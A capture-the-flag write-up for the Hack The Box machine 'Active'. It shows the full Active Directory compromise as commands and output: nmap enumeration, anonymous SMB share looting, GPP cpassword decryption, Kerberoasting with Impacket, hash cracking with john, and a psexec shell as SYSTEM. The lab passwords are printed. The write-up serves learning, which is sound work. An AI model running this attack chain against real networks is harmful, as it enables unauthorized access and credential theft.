HTB - Active 10.129.138.35

Enumeration:

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped    syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49169/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49173/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49174/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 8.1 Update 1 (96%), Microsoft Windows Vista or Windows 7 SP1 (96%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (96%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94%E=4%D=8/5%OT=53%CT=%CU=38448%PV=Y%DS=2%DC=T%G=N%TM=64CE5211%P=aarch64-unknown-linux-gnu)
SEQ(SP=FE%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=7)
OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.007 days (since Sat Aug  5 08:34:15 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-08-05T13:47:19
|_  start_date: 2023-08-05T13:38:22
|_clock-skew: 3m42s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 27111/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44592/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 11044/udp): CLEAN (Failed to receive data)
|   Check 4 (port 39378/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   69.49 ms 10.10.14.1
2   69.86 ms 10.129.138.35


From the nmap scan we can see the name of the domain is active.htb. Let's add that to our /etc/hosts file.

$ echo "10.129.138.35   active.htb" >> /etc/hosts

Listing SMB Shares with smbmap we can see that we have access to the Replication Share. We can connect to it with smbclient and transfer all the files to our local machine with the following commands.

smbclient -N //active.htb/Replication

smb: \> prompt 
smb: \> recurse ON
smb: \> mget *

cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>


Username: active.htb\SVC_TGS

cpassword: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18

We get a password of GPPstillStandingStrong2k18

Username: active.htb\SVC_TGS
Password: GPPstillStandingStrong2k18


Initial foothold with Impacket.

impacket-GetUserSPNs 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN] [-usersfile USERSFILE] [-request]
                      [-request-user username] [-save] [-outputfile OUTPUTFILE] [-debug] [-hashes LMHASH:NTHASH]
                      [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                      target

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain/username[:password]

options:
  -h, --help            show this help message and exit
  -target-domain TARGET_DOMAIN
                        Domain to query/request if different than the domain of the user. Allows for Kerberoasting
                        across trusts.
  -usersfile USERSFILE  File with user per line to test
  -request              Requests TGS for users and output them in JtR/hashcat format (default False)
  -request-user username
                        Requests TGS for the SPN associated to the user specified (just the username, no domain
                        needed)
  -save                 Saves TGS requested to disk. Format is <username>.ccache. Auto selects -request
  -outputfile OUTPUTFILE
                        Output filename to write ciphers in JtR/hashcat format
  -debug                Turn DEBUG output ON
  
  
# impacket-GetUserSPNs -request -dc-ip 10.129.138.35 active.htb/SVC_TGS:GPPstillStandingStrong2k18


# john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:10 DONE (2023-08-05 10:10) 0.09980g/s 1051Kp/s 1051Kc/s 1051KC/s Tiffani29..Thrasher
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


We now have a pasword of Ticketmaster1968

# impacket-psexec active.htb/administrator@10.129.138.35 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.138.35.....
[*] Found writable share ADMIN$
[*] Uploading file NSWiFSOA.exe
[*] Opening SVCManager on 10.129.138.35.....
[*] Creating service BWEB on 10.129.138.35.....
[*] Starting service BWEB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system


And we now have a shell as NT AUTHORITY \ SYSTEM!!!




